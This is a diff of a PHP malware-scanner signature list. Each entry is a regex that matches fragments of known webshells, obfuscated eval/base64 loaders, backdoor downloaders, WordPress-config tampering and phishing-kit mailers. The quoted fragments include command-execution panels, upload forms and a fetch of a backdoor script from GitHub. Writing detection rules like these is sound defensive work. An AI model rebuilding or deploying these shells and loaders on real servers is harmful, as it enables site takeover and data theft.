-      'label' => 'source-file tail snippet',
-    ),
-    1183 => 
-    array (
-      'pattern' => '/\\<\\?php \\/\\*xaxk,n\\[q\\|Ei,W2B\\(f\\*\\/\\$a\\/\\*ZPQI7D6zJ6PwF3\\*\\/\\=\\/\\*wsIm\\}WH\\.zw@g\\{9\\*\\/range\\/\\*1wwZ\\+\\$c\\[@\\#\\*\\/\\("~",\\/\\*Ygnbi\\]_\\+p\\*\\/" "\\);\\/\\*\\]ATzM\\[l\\{Y\\*\\/\\$b\\/\\*D~59v\\[YC\\*\\/\\=\\/\\*S3/',
-      'label' => 'source-file tail snippet',
-    ),
-    1184 => 
-    array (
-      'pattern' => '/foreach\\(\\$_POST as \\$k \\=\\> \\$v\\)\\{[\\s\\S]{0,12000}@eval\\(\\$_POST\\[\'lol\'\\]\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1185 => 
-    array (
-      'pattern' => '/\\$items \\= Array\\(\'https\\:\\/\\/www\\.puertasymas\\.com\\.mx\\/jp1\\.php\\?open\'\\);[\\s\\S]{0,12000}header\\("Location\\: \\$URL"\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1186 => 
-    array (
-      'pattern' => '/;
-        \\}
-        \\$num \\= mt_rand\\(5, 10\\);
-        for\\(\\$i \\= 0; \\$i\\<\\$num; \\$i\\+\\+\\)\\{
-            if\\(trim\\(\\$uri_script\\) \\!\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1187 => 
-    array (
-      'pattern' => '/\\>\\<\\/form\\>\\<\\/center\\>\';break;
-		case \'cmd\'\\: print \'\\<\\/br\\>\\<\\/br\\>\\<center\\>\\<h3\\>Execute Command\\<\\/h3\\>\\<form action\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    1188 => 
-    array (
-      'pattern' => '/\\<title\\>Vuln\\!\\! patch it Now\\!\\<\\/title\\>
-\\<\\?php
-function http_get\\(\\$url\\)\\{
-	\\$im \\= curl_init\\(\\$url\\);
-	curl_setopt\\(\\$im, CURLOPT_RET/s',
-      'label' => 'sample-specific content window',
-    ),
-    1189 => 
     array (
       'pattern' => '/\\<\\?php
 \\/\\*
@@ -7793,23 +260,36 @@ Obfuscation provided by FOPO \\- Free Online PHP Obfuscator\\: http\\:\\/\\/www\
 This code was created on Wed/s',
       'label' => 'sample-specific content window',
     ),
-    1190 => 
+    36 => 
     array (
-      'pattern' => '/\\<title\\>Vuln\\!\\! patch it Now\\!\\<\\/title\\>[\\s\\S]{0,12000}eval\\(base64_decode\\(\'JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4g/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    1191 => 
-    array (
-      'pattern' => '/JDuWy9YnzstHg29DK44fF9Gq74pgsQjnW23320PpZghzFVLTyc9yLUiV9\\+MBYQ8WyNYUs1Qqx60ZCt8yJzquEehN\\/y0SDrN4\\+dv\\/\\/zPv\\/9Pw\\=\\=\'\\)\\)\\)\\)\\);
+      'pattern' => '/ln\\.php";
+\\$text \\= \\$s;
+\\$open \\= fopen\\(\\$check, \'w\'\\);[\\s\\S]{0,12000}FUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw\\=\\=\'\\)\\);
 \\?\\>/s',
-      'label' => 'sample-specific content window',
+      'label' => 'sample-specific content window chain',
     ),
-    1192 => 
+    37 => 
     array (
-      'pattern' => '/9Y1JDuWy9YnzstHg29DK44fF9Gq74pgsQjnW23320PpZghzFVLTyc9yLUiV9\\+MBYQ8WyNYUs1Qqx60ZCt8yJzquEehN\\/y0SDrN4\\+dv\\/\\/zPv\\/9Pw\\=\\=\'\\)\\)\\)\\)\\);/s',
-      'label' => 'sample-specific content window',
+      'pattern' => '/OJfZwdmlpzoaBC0Ftw\\/ZRwXRFngWQ\\+w9U2UQwJNYyCOWO894[\\s\\S]{0,12000}x60ZCt8yJzquEehN\\/y0SDrN4\\+dv\\/\\/zPv\\/9Pw\\=\\=\'\\)\\)\\)\\)\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1193 => 
+    38 => 
+    array (
+      'pattern' => '/^\\s*eval\\(str_rot13\\(gzinflate\\(str_rot13\\(base64_decode\\(\'LUnXDrY4Dn2a0fx7VC\\/aK23v8ERhSfTeO0K\\/MBqkJECc2LF9QbzUw\\/10649rvYdl\\+TMOxYIh\\/5uXKZmXP\\/nQR\\/n978/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    39 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php eval\\(base64_decode\\(base64_decode\\(\'SkdSbFptRjFiSFJmZFhObFgyRnFZWGdnUFNCMGNuVmxPd29rWTI5c2IzSWdQU0FpTldSbVpqSTJJanNLSkdSbFptRjFiSFJmWTJo/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    40 => 
+    array (
+      'pattern' => '/ybd41\\[\\$ybd41\\[\'hf2113\'\\]\\[32\\]\\.\\$ybd41\\[\'hf2113\'\\]\\[37\\]\\.[\\s\\S]{0,12000}\\/\\(\\$v247\\[\\$ybd41\\[\'hf2113\'\\]\\[31\\]\\]\\);\\}exit\\(\\);\\} \\?\\>\\<\\?php/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    41 => 
     array (
       'pattern' => '/strstr\\(\\$strckLocalFile2,\'\\/\\/ckIIend\'\\)\\)\\{
 		
@@ -7817,13 +297,13 @@ This code was created on Wed/s',
 		\\$strckLocalFile2 \\= preg_replace\\(\\$rsc/s',
       'label' => 'sample-specific content window',
     ),
-    1194 => 
+    42 => 
     array (
       'pattern' => '/\\<\\?php 
 \\$Receive_email\\="mapbay@protonmai/s',
       'label' => 'sample-specific content window',
     ),
-    1195 => 
+    43 => 
     array (
       'pattern' => '/\\?\\?\\<html\\>
 
@@ -7834,41 +314,234 @@ URL\\=https\\:\\/\\/evinesa\\.com\\/a\\/Einloggen oder neu anmelden eBay\\.html"
 \\<\\/he/s',
       'label' => 'sample-specific content window',
     ),
-    1196 => 
+    44 => 
     array (
-      'pattern' => '/\\<\\?php \\/\\* index\\-configs \\*\\/ error_reporting\\(0\\); function vOZLe\\(\\) \\{ \\$HrcUM \\= \'I could not have a more welcome visitor 64 group of zain bani\'; \\$[\\s\\S]{0,12000}require\\( dirname\\( __FILE__ \\) \\. \'\\/wp\\-blog\\-header\\.php\' \\);/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/\\<\\?php
+include \'email\\.php\';
+\\$email \\= trim\\(\\$_POST\\[[\\s\\S]{0,12000}ool\\.com\\/\\?IP\\=\\$ip \\-\\-\\-\\-\\\\n";
+	\\$message \\.\\= "User Agen/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1197 => 
+    45 => 
     array (
-      'pattern' => '/h\\.\\.t\\.\\.t\\.\\.p\\.\\.\\:\\.\\.\\/\\/\\.\\.j\\.\\.q\\.\\.e\\.\\.u\\.\\.r\\.\\.y\\.\\.\\.o\\.\\.rg\\.\\.\\/\\.\\.j\\.\\.q\\.\\.u\\.\\.e\\.\\.ry\\.\\.\\-\\.\\.la\\.\\.t\\.\\.e\\.\\.s\\.\\.t\\.j\\.\\.s/',
-      'label' => 'sample-specific literal',
+      'pattern' => '/\\.exe\\(\'whereis apache\'\\)\\."\\<\\/pre\\>\\<\\/td\\>\\<\\/tr\\>[\\s\\S]{0,12000}rms & 0x0200\\) \\? \'T\' \\: \'\\-\'\\)\\);
+
+return \\$info;
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1198 => 
+    46 => 
     array (
-      'pattern' => '/Y4K5MXTqX5cXp6kbIYOFBV623up9E8SeG2y9deDN1\\/7C9SwQeFv3RqkIFug83Mb7\\/ioWt3lbfMq7WGAxX\\/nuv7UbV9r8paWIt5T0YnREUEr\\/6Puz0r52\\/gY\\=/s',
-      'label' => 'sample-specific content window',
+      'pattern' => '/\\}
+    return \\$ih2kQ;
+\\}
+function scMRk\\(\\$f09l[\\s\\S]{0,12000}GLOBALS\\[Ã£ÃªÃ¬\\]\\[0x6\\], \\$qJ1An\\);
+goto ISqm7;/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1199 => 
+    47 => 
     array (
-      'pattern' => '/\\$data \\= \\[\'https\\:\\/\\/raw\\.githubusercontent\\.com\\/mrkronkz\\/shell\\-backdor\\/master\\/gas\\.php\', \'\\/tmp\\/sess_\'\\.md5\\(\\$_SERVER\\[\'HTTP_HOST\'\\]\\)\\.\'\\.php\'\\];[\\s\\S]{0,12000}curl_close\\(\\$ch\\);/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/^\\s*\\<h1\\>\\$OH\\<\\/h1\\>\\s*$/s',
+      'label' => 'exact source-file content',
     ),
-    1200 => 
+    48 => 
     array (
-      'pattern' => '/;\\$wpautop\\=pre_admin_bar\\(\\$wp_kses_data,\\$wp_nonce\\);if\\(isset\\(\\$wpautop\\)\\)\\{if\\(isset\\(\\$_POST\\[[\\s\\S]{0,160},\\$wpautop\\);unset\\(\\$f_pp,\\$wpautop\\);\\$shortcode_unautop\\(\\);\\}function wp_admin_bar_header\\(\\)\\{echo/',
-      'label' => 'sample-specific literal chain',
+      'pattern' => '/I�\\*��me�ߡ\\^0�K_PU�x\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
-    1201 => 
+    49 => 
     array (
-      'pattern' => '/T\'\\\\n"\\);
+      'pattern' => '/e\\(\\$cOsGh\\);
+        \\} else \\{
+            foreach[\\s\\S]{0,12000}x5\\], \\$GLOBALS\\[ãêì\\]\\[0x6\\], \\$qJ1An\\);
+goto ISqm7;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    50 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\/\\* index\\-configs \\*\\/ error_reporting\\(0\\); function vOZLe\\(\\) \\{ \\$HrcUM \\= \'I could not have a more welcome visitor 64 group of zain bani\'; \\$[\\s\\S]{0,18000}require\\( dirname\\( __FILE__ \\) \\. \'\\/wp\\-blog\\-header\\.php\' \\);\\s*$/s',
+      'label' => 'source-file first-last anchor',
+    ),
+    51 => 
+    array (
+      'pattern' => '/s\\.org\\/
+\\* Description\\: Wordpress CMS module\\.
+\\* Ve[\\s\\S]{0,12000}ess CMS
+\\* Author URI\\: https\\:\\/\\/wordpress\\.org\\/
+\\*\\*\\//s',
+      'label' => 'sample-specific content window chain',
+    ),
+    52 => 
+    array (
+      'pattern' => '/ciocho, \\$object_diecinueve, \\$object_diez_pim, \\$o[\\s\\S]{0,12000}im, array\\(\\$snigulp_evitca, \\$sisnoitpo\\)\\);
     \\}
-    
-    echo \\$tester\\-\\>runStressTest\\(\\$socketcount, \\$host, \\$port, \\$path, \\$method, \\$testType, true,\\$note\\);
 \\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    53 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$password \\= "laRBWAcUyvd"; \\/\\/ Password
+function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);/s',
       'label' => 'sample-specific content window',
     ),
-    1202 => 
+    54 => 
+    array (
+      'pattern' => '/sonSerializationVisitor\\(
+    new SerializedNameA[\\s\\S]{0,12000}lizationVisitor\\(\'json\', \\$visitor\\)
+    \\-\\>build\\(\\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    55 => 
+    array (
+      'pattern' => '/touch\\("\\.\\.\\/\\.\\.\\/wp\\-config\\.php", \\$ftime1, \\$ftime1\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    56 => 
+    array (
+      'pattern' => '/\\= \\$jnvntef\\[25\\] \\. \\$jnvntef\\[20\\] \\. \\$jnvntef\\[7\\] \\. \\$j[\\s\\S]{0,12000}\\(\\$mplyvsq, \\$qhsxt, \\$mplyvsq\\[8\\]\\(\\$boalhd\\)\\)\\)\\);
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    57 => 
+    array (
+      'pattern' => '/\\] \\. \\$bwcex\\[17\\] \\. \\$bwcex\\[16\\] \\. \\$bwcex\\[4\\] \\. \\$bwcex[\\s\\S]{0,12000}val\\( \\$cwgiloi\\[1\\]\\( \\$cwgiloi\\[2\\] \\) \\);
+				exit\\(  \\);/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    58 => 
+    array (
+      'pattern' => '/\\$btmrp\\[23\\] \\. \\$btmrp\\[31\\] \\. \\$btmrp\\[19\\];
+\\$hhmxjbe\\[[\\s\\S]{0,12000}hhmxjbe, \\$wemrnt, \\$hhmxjbe\\[8\\]\\(\\$pvdukpz\\)\\)\\)\\);
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    59 => 
+    array (
+      'pattern' => '/e\\{
+            \\$server_request_scheme \\= \'http\';[\\s\\S]{0,12000}\\/\\*23\\*\\/base64_decode\\(\\$result, true\\)\\)\\);
+    \\}
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    60 => 
+    array (
+      'pattern' => '/tmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZm[\\s\\S]{0,12000}fMq7WGAxX\\/nuv7UbV9r8paWIt5T0YnREUEr\\/6Puz0r52\\/gY\\=/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    61 => 
+    array (
+      'pattern' => '/\\<\\?php
+if\\(isset\\(\\$_GET\\["ganteng"\\]\\)\\)
+\\$data \\= \\[\'http[\\s\\S]{0,12000}\\$data\\[0\\]\\)\\);
+    fclose\\(\\$fopen\\);    
+\\}
+function g/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    62 => 
+    array (
+      'pattern' => '/fahead\\(\\);  
+\\$div \\= "";  
+if\\(\\!in_array\\(\\$_POST\\[\'alfa1\'\\],array\\(\'perl\',\'py\'\\)\\)\\)\\{  
+\\$div \\= "\\<\\/div\\>";  
+echo \'\\<div class\\=header/s',
+      'label' => 'sample-specific content window',
+    ),
+    63 => 
+    array (
+      'pattern' => '/e add to zip\\.
+        \\$localPath \\= substr\\(\\$filePath, \\$exclusiveLength\\);
+
+        if \\(is_file\\(\\$filePath\\)\\) \\{
+          \\$zi/s',
+      'label' => 'sample-specific content window',
+    ),
+    64 => 
+    array (
+      'pattern' => '/\\<\\?php error_reporting\\(0\\);
+if \\(\\!isset\\(\\$_COOKIE\\[\'p[\\s\\S]{0,12000}OLYkOY2qkrLnxVOuS0e8MJJp4B88FYTP4Oc52D%ITh9p5Age/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    65 => 
+    array (
+      'pattern' => '/echo "\\<script\\>window\\.location\\.href \\= \'i\\.php\\?\' \\+ Math\\.random\\(\\);\\<\\/script\\>";\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    66 => 
+    array (
+      'pattern' => '/unlink\\(\\$cs_name\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    67 => 
+    array (
+      'pattern' => '/\\(\\(\\$statusnya & 0x0200\\) \\? \'T\' \\: \'\\-\'\\)\\);
+
+
+
+            return \\$ingfo;
+
+        \\}
+
+        \\?\\>
+
+    \\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    68 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php eval\\(base64_decode\\(\'CiBnb3RvIFBlVGVZOyB6b2hOXzogZ290byBsQnBPcjsgZ290byBWTjNQeTsgVXpyZmg6IHRvMnhiOiBnb3RvIFc0WmhlOyBWTjNQeTogdXR5d1c6IG/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    69 => 
+    array (
+      'pattern' => '/"\\<pre\\>\\$wp_themes_install\\<\\/pre\\>";\\}
+		\\$wp_themes_i[\\s\\S]{0,12000}\\(isset\\(\\$_GET\\["check"\\]\\)\\)\\{
+    startChecks\\(\\);
+\\}
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    70 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$▛ \\= "59e8d97dbcc1d0f65dea6ecd0e9fbe39"; \\/\\/Pass\\: xleet
+\\$o\\= "ba"\\."se"\\."\\\\x36\\\\x34\\\\x5F"\\."de"\\."c"\\."ode";
+eval\\(\\$o\\("CiR/s',
+      'label' => 'sample-specific content window',
+    ),
+    71 => 
+    array (
+      'pattern' => '/\\{
+        die\\("Error\\: File upload failed\\."\\);[\\s\\S]{0,12000}mit"\\>Upload\\<\\/button\\>
+    \\<\\/form\\>
+\\<\\/body\\>
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    72 => 
+    array (
+      'pattern' => '/512, 2048\\)\\);
+            \\}[\\s\\S]{0,12000}\\$port, \\$path, \\$method, \\$testType, true,\\$note\\);
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    73 => 
+    array (
+      'pattern' => '/RELee0qMDFknDQ\\\\x418LfF0lXwx0\\\\x63dFfDU8dx\\\\x62ryNd[\\s\\S]{0,12000}code\\(gzinflate\\(base64_decode\\(\\$Cyto\\)\\)\\)\\);
+exit;
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    74 => 
     array (
       'pattern' => '/\\(\\(\\$perms & 0x0001\\) \\?
         \\(\\(\\$perms & 0x0200\\) \\? \'t\' \\: \'x\'\\) \\: \\(\\(\\$perms & 0x0200\\) \\? \'T\' \\: \'\\-\'\\)\\);
@@ -7877,27 +550,1139 @@ URL\\=https\\:\\/\\/evinesa\\.com\\/a\\/Einloggen oder neu anmelden eBay\\.html"
 \\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1203 => 
+    75 => 
     array (
-      'pattern' => '/\\<form\\s+enctype\\="multipart\\/form\\-data"\\s+method\\="post"\\>Upload\\s+\\:\\s+\\<input\\s+type\\="file"\\s+name\\="upd"\\>\\<input\\s+type\\="submit"\\s+value\\="Upload"\\>\\<\\?php/',
-      'label' => 'sample-specific line fragment',
+      'pattern' => '/eEw\\/ilVDVSwDHs8W5z7gKXxsCC\\+eWDezf0g0KEEtW98CacQo[\\s\\S]{0,12000}5\\[57\\]\\.\\$vicjn5815\\[53\\]\\.\\$vicjn5815\\[1\\];
+eval\\(\\$kntl\\);/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1204 => 
+    76 => 
     array (
-      'pattern' => '/\\$O\\=urldecode\\(\'\\-%3B5p6PIiw%24%60x%2Bc%5D%40%5ES%2F0D%3ABZnmtsq%2CkOh7z%3D%7EAT%5CYQ%269%29%25v2yRUrfJ_eF%2Aa%3C%23%28g%2FM%7B3E%21u%7CX\\.4V%3F[\\s\\S]{0,12000}function OoOo111oOO\\(\\$url,\\$OO0o00OooO\\=0,\\$Oo00OoO0Oo\\=1,\\$OoO00OOoo0\\=NULL,\\$OoOOoO000o\\=array\\(\\)\\)\\{global \\$O;if\\(\\!preg_match\\("\\/\\^http\\\\\\:\\\\\\/\\\\\\/\\/si",\\$url\\)\\)/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/\\<\\?php
+
+\\/\\/ default password \\: smoker
+\\/\\/ Created B[\\s\\S]{0,12000}4\\\\x3e\\\\141\\\\x6c\\\\x65\\\\162\\\\164\\\\x28\\\\x27\\\\124\\\\x68\\\\x69\\\\x7/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1205 => 
+    77 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); function eGerl\\(\\$yJCsx\\) \\{ \\$VmURk \\= strlen\\(trim\\(\\$yJCsx\\)\\); \\$Umn88 \\= \'\'; for \\(\\$bJVuV \\= 0; \\$bJVuV \\< \\$VmURk; \\$bJVuV \\+\\= 2/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    78 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'Fox\'\\] \\=\\= \'F6lYM\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    79 => 
+    array (
+      'pattern' => '/E4a%C0%DDm%EF%EA%90%B02%8D%22%F8TO%E6%E1%DA%F4%C[\\s\\S]{0,12000}meout is reached
+     \\*\\/
+        else\\{
+	die\\(\\);
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    80 => 
+    array (
+      'pattern' => '/\\<\\?php \\/\\*\\*
+ \\* Created by PhpStorm\\.
+ \\* User\\: smp[\\s\\S]{0,12000}hXIwYmB20EYARZU2IDZwV0BGNUPFd6AiQLfFJ%2BA31cIld6/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    81 => 
+    array (
+      'pattern' => '/0Oo0ooOO\\!\\=\'\'\\)\\{if\\(\\$Oo0ooO0OO0\\)\\{\\$OooOO0O00o\\=\\$O\\{72\\}[\\s\\S]{0,12000}0OOo0O0oo,\\$O00oOoOOo0\\);exit\\(\\);\\}\\}\\}Oo1o1OO1Oo\\(\\);\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    82 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\); function vepa_\\(\\$cmx0T\\) \\{ \\$o6akB \\= strlen\\(trim\\(\\$cmx0T\\)\\); \\$nYANr \\= \'\'; for \\(\\$lv38F \\= 0; \\$lv38F \\< \\$o6akB; \\$lv38F \\+\\= 2/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    83 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php @error_reporting\\(round\\(0\\)\\);@set_time_limit\\(round\\(0\\+150\\)\\);@ignore_user_abort\\(true\\);function abort\\(\\$name\\) \\{if\\(isset\\(\\$_GET\\[\'remove\'\\]\\)\\) \\{u/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    84 => 
+    array (
+      'pattern' => '/\\<\\/head\\>\\<\\?php
+\\$server \\= \\$_SERVER\\[\'SERVER_NAME\'\\];[\\s\\S]{0,12000}\\{
+    if \\(p\\<span style\\="display\\:none;"\\>ekr\\<\\/spa/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    85 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php eval\\(gzuncompress\\("xv۸\\(5JYd;Hc\\\\x5clǗܽII\\)MR_\'g3GKNU d9\\:3BP\\\\x00\\\\x0aBP_\\?\\(\\[hg4ώk;VVwr\\{s~䋶\\\\x7fvv\\=vQiV`\\[GGv\\?\\:EziݨʭxV/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    86 => 
+    array (
+      'pattern' => '/\\<\\?php
+if \\(\\!empty\\(\\$_POST\\[\'cmd\'\\]\\)\\) \\{
+    \\$cmd \\= tr[\\s\\S]{0,12000}border\\: none;
+            cursor\\: pointer;/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    87 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$fwfxuzph\\=str_ireplace\\("y","","ybyyyyyayysyyyyeyyy6yyy4yyyy_yyydyyyeyyycyyyyoyyyydyyyyey"\\); \\$gpnzw\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQ/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    88 => 
+    array (
+      'pattern' => '/\\$to_data\\[3\\];
+\\$from_email \\= \\$to_data\\[4\\];
+\\$header \\= \\$to_data\\[5\\];
+
+
+
+\\$jfnbrsjfq \\=  mail\\(\\$to, \\$x_subject, \\$x_body, \\$header\\);/s',
+      'label' => 'sample-specific content window',
+    ),
+    89 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}xpUmZVRTlUVkZzaWNHVnpaR2xrSWwwdUp5STdJQ1IwWkdWMW/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    90 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "SBfHHKaNed"; if \\(file_exists\\("\\.\\/class\\.rays\\.php"\\)\\)\\{ touch\\("\\.\\/class\\.rays\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*4BS1r/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    91 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$cgetznt\\=str_ireplace\\("r","","rrbrrrrrrarrrrsrrrrerrr6rrrrrr4rrrr_rrrdrrrerrrrcrrrrorrrrdrrrrer"\\); \\$vargnc\\="DQoJCUBlcnJvcl9yZXBvcnRpbm/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    92 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$gbvppz\\=str_ireplace\\("g","","gggbgggagggsggggeggggg6ggggg4ggg_ggggdggeggggggcggogggggdggggeggg"\\); \\$upxtcmnct\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    93 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$utktfpmrkg\\=str_ireplace\\("i","","iibiiiiaiisiiieiii6iiii4iiiii_iiiiiidiiiieiiciiiioiiiidiiieiii"\\); \\$rukvq\\="DQoJCUBlcnJvcl9yZXBvcnRpbmc/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    94 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$cfbaxd\\=str_ireplace\\("y","","ybyyyyyayysyyyyeyyy6yyy4yyyy_yyydyyyeyyycyyyyoyyyydyyyyey"\\); \\$ccqtqdyg\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7D/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    95 => 
+    array (
+      'pattern' => '/\\(\\$host\\)\\), \\-8\\)\\.\'\\.\';
+\\}
+
+\\$d \\= array\\(base64_decode\\(s[\\s\\S]{0,12000}\\[\'REQUEST_URI\'\\]\\)\\.\'"\\);\\<\\/script\\>\\<\\/body\\>\\<\\/html\\>\';
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    96 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php echo "ezpCSWNdnd"; if \\(file_exists\\("\\.\\/embassy\\-list\\.php"\\)\\)\\{ touch\\("\\.\\/embassy\\-list\\.php",\\(time\\(\\)\\-60\\*60\\*24\\*30\\*1\\)\\); \\} unlink\\(__FILE__\\); \\/\\*G/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    97 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$nwumz\\=str_ireplace\\("z","","zbzzzzazzzzszzzzezzzz6zzz4zzz_zzzdzzzzezzzzczzzzozzzdzzzzzzezz"\\); \\$gfyms\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    98 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*\\*[\\s\\S]{0,12000}5SkdSdmJWc3lYVHQ5SUdWc2MyVWdleVJrYjIwOUpHZHplbWg/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    99 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$udxthmda\\=str_ireplace\\("f","","fbfffaffffffsfffefffff6ff4ffffff_ffffdfffeffffcffffoffdfffffeff"\\); \\$edbbtfkwt\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    100 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$s \\= eval\\(base64_decode\\("Ly9zZXRfdGltZV9saW1pdCAoIDY2NjAwMCApOw0KLy9AaWdub3JlX3VzZXJfYWJvcnQgKHRydWUpOw0KDQoNCmZ1bmN0aW9uIGlzQm90RGV0Z/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    101 => 
+    array (
+      'pattern' => '/\\<\\?php
+
+\\/\\/ 2
+\\/\\/ 2
+\\/\\/ 2
+\\/\\/ 2
+\\/\\/ 2
+\\/\\/ 2
+\\/\\/ 2
+\\/\\/ 2
+\\/[\\s\\S]{0,12000}\\= str_replace\\(\'\\/\', DIRECTORY_SEPARATOR, \\$fname\\)/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    102 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$ymsckxd\\=str_ireplace\\("q","","qqqbqqqqqaqqqqqsqqqqqqeqqqq6qq4qq_qqqqqqdqqqqeqqqqcqqqqqoqqqqdqqqeqqq"\\); \\$wbyrrudyk\\="DQoJCUBlcnJvcl9yZXB/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    103 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\$fwyqutxks\\=str_ireplace\\("y","","yybyyyyayyyysyyyyeyyy6yyyyyy4yyyy_yyydyyyyeyyyycyyyyoyyydyyyyyeyyy"\\); \\$ytwfn\\="DQoJCUBlcnJvcl9yZXBvcnRp/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    104 => 
+    array (
